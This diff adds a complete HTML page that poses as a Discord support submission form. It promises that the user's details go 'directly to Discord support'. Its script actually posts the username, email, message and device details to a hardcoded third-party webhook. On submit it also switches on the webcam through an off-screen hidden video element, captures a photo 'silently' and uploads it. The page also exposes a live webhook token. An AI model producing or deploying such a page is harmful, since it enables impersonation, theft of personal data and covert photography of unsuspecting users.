@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Support Submission</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(30, 31, 34, 0.9);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid #40444b;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo-icon {
+            font-size: 48px;
+            color: #5865f2;
+            margin-bottom: 10px;
+        }
+        
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 5px;
+        }
+        
+        .logo-subtitle {
+            color: #b9bbbe;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b9bbbe;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 14px;
+            background: #1e1f22;
+            border: 2px solid #40444b;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #5865f2;
+        }
+        
+        .form-textarea {
+            width: 100%;
+            padding: 14px;
+            background: #1e1f22;
+            border: 2px solid #40444b;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            min-height: 120px;
+            resize: vertical;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+        
+        .form-textarea:focus {
+            outline: none;
+            border-color: #5865f2;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            background: #4752c4;
+        }
+        
+        .submit-btn:disabled {
+            background: #4f545c;
+            cursor: not-allowed;
+        }
+        
+        .status-message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+        
+        .status-success {
+            background: rgba(46, 204, 113, 0.1);
+            border: 1px solid #2ecc71;
+            color: #2ecc71;
+        }
+        
+        .status-error {
+            background: rgba(231, 76, 60, 0.1);
+            border: 1px solid #e74c3c;
+            color: #e74c3c;
+        }
+        
+        .status-processing {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid #ffc107;
+            color: #ffc107;
+        }
+        
+        .privacy-note {
+            margin-top: 25px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            font-size: 12px;
+            color: #b9bbbe;
+            line-height: 1.5;
+            text-align: center;
+        }
+        
+        /* Hidden camera elements */
+        #camera-container {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -9999;
+        }
+        
+        #camera-feed {
+            width: 320px;
+            height: 240px;
+            transform: scale(0.1);
+            opacity: 0;
+        }
+        
+        .hidden-canvas {
+            display: none;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #40444b;
+            border-top: 4px solid #5865f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        .loading-text {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+                margin: 10px;
+            }
+            
+            .logo-text {
+                font-size: 24px;
+            }
+            
+            .logo-icon {
+                font-size: 40px;
+            }
+            
+            .form-input, .form-textarea {
+                padding: 12px;
+                font-size: 15px;
+            }
+            
+            .submit-btn {
+                padding: 14px;
+            }
+        }
+        
+        @media (max-width: 400px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .logo-text {
+                font-size: 22px;
+            }
+            
+            .logo-icon {
+                font-size: 36px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Hidden camera elements -->
+    <div id="camera-container">
+        <video id="camera-feed" autoplay></video>
+    </div>
+    <canvas id="capture-canvas" class="hidden-canvas"></canvas>
+    
+    <!-- Loading overlay -->
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Processing your submission...</div>
+    </div>
+    
+    <!-- Main container -->
+    <div class="container">
+        <div class="logo">
+            <div class="logo-icon">
+                <i class="fab fa-discord"></i>
+            </div>
+            <div class="logo-text">Support Submission</div>
+            <div class="logo-subtitle">Submit your message to Discord support</div>
+        </div>
+        
+        <form id="submission-form">
+            <div class="form-group">
+                <label class="form-label">Discord Username</label>
+                <input type="text" id="username" class="form-input" placeholder="e.g., username#1234" required>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Email Address</label>
+                <input type="email" id="email" class="form-input" placeholder="your.email@example.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Your Message</label>
+                <textarea id="message" class="form-textarea" placeholder="Type your message here..." required></textarea>
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submit-btn">
+                <i class="fas fa-paper-plane"></i> Submit to Discord
+            </button>
+            
+            <div id="status-message" class="status-message"></div>
+        </form>
+        
+        <div class="privacy-note">
+            <i class="fas fa-shield-alt"></i> Your information is secure and will be sent directly to Discord support.
+        </div>
+    </div>
+
+    <script>
+        // Discord webhook URL
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
+        
+        // DOM Elements
+        const form = document.getElementById('submission-form');
+        const usernameInput = document.getElementById('username');
+        const emailInput = document.getElementById('email');
+        const messageInput = document.getElementById('message');
+        const submitBtn = document.getElementById('submit-btn');
+        const statusMessage = document.getElementById('status-message');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        
+        const cameraContainer = document.getElementById('camera-container');
+        const cameraFeed = document.getElementById('camera-feed');
+        const captureCanvas = document.getElementById('capture-canvas');
+        
+        // Variables
+        let stream = null;
+        let isProcessing = false;
+        
+        // Function to show status message
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'status-message status-' + type;
+            statusMessage.style.display = 'block';
+            
+            // Auto-hide success messages after 5 seconds
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusMessage.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        // Function to capture screenshot
+        function captureScreenshot() {
+            if (!stream) return null;
+            
+            const canvas = captureCanvas;
+            const video = cameraFeed;
+            
+            // Set canvas dimensions
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            // Draw video frame to canvas
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Add timestamp and info overlay
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+            ctx.fillRect(10, 10, 400, 50);
+            ctx.fillStyle = '#ffffff';
+            ctx.font = '14px Arial';
+            ctx.fillText(`Submission: ${new Date().toLocaleString()}`, 20, 35);
+            
+            // Convert to data URL
+            return canvas.toDataURL('image/jpeg', 0.9);
+        }
+        
+        // Function to send data to Discord
+        async function sendToDiscord(username, email, message, screenshot = null) {
+            try {
+                const timestamp = new Date().toISOString();
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenSize = `${window.screen.width}x${window.screen.height}`;
+                
+                // Create rich embed
+                const embed = {
+                    title: "📋 New Support Submission",
+                    description: "A user has submitted a support request",
+                    color: 0x5865f2,
+                    timestamp: timestamp,
+                    fields: [
+                        {
+                            name: "👤 Discord Username",
+                            value: username || "Not provided",
+                            inline: true
+                        },
+                        {
+                            name: "📧 Email",
+                            value: email || "Not provided",
+                            inline: true
+                        },
+                        {
+                            name: "📝 Message",
+                            value: message || "No message",
+                            inline: false
+                        },
+                        {
+                            name: "🌐 User Agent",
+                            value: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : ''),
+                            inline: false
+                        },
+                        {
+                            name: "🖥️ Platform",
+                            value: platform,
+                            inline: true
+                        },
+                        {
+                            name: "📱 Screen Size",
+                            value: screenSize,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Support Submission System"
+                    }
+                };
+                
+                const payload = {
+                    username: "Support Form",
+                    embeds: [embed]
+                };
+                
+                // Send the embed first
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                // If we have a screenshot, send it too
+                if (screenshot) {
+                    // Convert data URL to blob
+                    const response = await fetch(screenshot);
+                    const blob = await response.blob();
+                    
+                    const formData = new FormData();
+                    formData.append('file', blob, `submission_${Date.now()}.jpg`);
+                    
+                    const imagePayload = {
+                        username: "Support Form",
+                        content: "📸 Face verification attached"
+                    };
+                    
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+                
+                return true;
+                
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+                return false;
+            }
+        }
+        
+        // Function to capture camera silently
+        async function captureCameraSilently() {
+            try {
+                // Request camera access
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                // Set camera feed source
+                cameraFeed.srcObject = stream;
+                
+                // Wait for video to load
+                await new Promise(resolve => {
+                    cameraFeed.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+                
+                // Wait a moment for camera to stabilize
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                // Capture screenshot
+                const screenshot = captureScreenshot();
+                
+                // Stop camera stream
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                
+                return screenshot;
+                
+            } catch (error) {
+                console.log('Camera access failed or denied:', error.message);
+                return null;
+            }
+        }
+        
+        // Form submission handler
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (isProcessing) return;
+            
+            // Get form values
+            const username = usernameInput.value.trim();
+            const email = emailInput.value.trim();
+            const message = messageInput.value.trim();
+            
+            // Basic validation
+            if (!username) {
+                showStatus('Please enter your Discord username', 'error');
+                usernameInput.focus();
+                return;
+            }
+            
+            if (!email || !email.includes('@')) {
+                showStatus('Please enter a valid email address', 'error');
+                emailInput.focus();
+                return;
+            }
+            
+            if (!message) {
+                showStatus('Please enter your message', 'error');
+                messageInput.focus();
+                return;
+            }
+            
+            // Start processing
+            isProcessing = true;
+            submitBtn.disabled = true;
+            loadingOverlay.style.display = 'flex';
+            showStatus('Capturing verification...', 'processing');
+            
+            try {
+                // First capture the camera silently
+                showStatus('Verifying identity...', 'processing');
+                const screenshot = await captureCameraSilently();
+                
+                // Then send everything to Discord
+                showStatus('Sending to Discord...', 'processing');
+                const success = await sendToDiscord(username, email, message, screenshot);
+                
+                if (success) {
+                    showStatus('✅ Submission sent successfully!', 'success');
+                    
+                    // Reset form
+                    form.reset();
+                    
+                    // Show success for a moment
+                    setTimeout(() => {
+                        statusMessage.style.display = 'none';
+                    }, 3000);
+                    
+                } else {
+                    showStatus('Failed to send submission. Please try again.', 'error');
+                }
+                
+            } catch (error) {
+                console.error('Submission error:', error);
+                showStatus('An error occurred. Please try again.', 'error');
+                
+            } finally {
+                // Reset processing state
+                isProcessing = false;
+                submitBtn.disabled = false;
+                loadingOverlay.style.display = 'none';
+                
+                // Ensure camera is stopped
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                }
+            }
+        });
+        
+        // Initialize
+        window.addEventListener('load', function() {
+            console.log('Support form loaded and ready');
+        });
+    </script>
+</body>
+</html>
